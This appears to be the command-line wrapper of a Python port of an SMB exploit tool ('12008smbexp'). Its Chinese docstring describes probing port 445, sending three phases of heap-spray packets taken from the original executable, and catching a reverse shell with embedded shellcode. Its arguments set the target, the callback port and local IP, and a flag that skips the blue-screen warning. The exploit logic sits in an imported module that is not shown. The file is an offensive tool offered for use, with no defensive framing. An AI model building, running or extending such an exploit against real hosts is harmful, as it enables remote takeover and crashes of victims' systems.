"""smbexp — Exploiting SMB (12008smbexp) 利用工具 Python 移植。

原始 `smbexp.exe <TagIp> <BackPort>`：
  1. 向目标 445 发 SMB negotiate（106 字节），从响应推断“蓝屏风险”提示；
  2. 分三阶段（70/86/195 次）发送 564 字节的 SMB 堆喷/乱序数据包
     （byte[176] = 阶段号 0/1/2）；
  3. 在 <BackPort> 监听反向 shell 连接，发送 322 字节 shellcode 后进入交互。

所有 SMB 载荷字节直接取自原 exe 的 .data 段（0x403010 / 0x4031A4 /
0x403210 / 0x40344C），未做任何二次打包。
"""
from . import smbexp


def smbexp_handle(args):
    return smbexp.run(args.target, args.backport, args.local_ip, args.yes)


def reg_subparser(subparsers):
    p = subparsers.add_parser(
        "smbexp", help="Exploiting SMB (12008smbexp) 利用工具",
        description=__doc__,
        formatter_class=__import__("argparse").RawDescriptionHelpFormatter)
    p.add_argument("target", help="<TagIp> 目标主机 IP/主机名")
    p.add_argument("backport", type=int, help="<BackPort> 反向 shell 连接端口")
    p.add_argument("-l", "--local-ip", default=None,
                   help="内嵌进 shellcode 的本地 IP（默认自动取首次连接的本机IP）")
    p.add_argument("-y", "--yes", action="store_true",
                   help="跳过 'Maybe Blue Screen' 确认提示")
    p.set_defaults(func=smbexp_handle)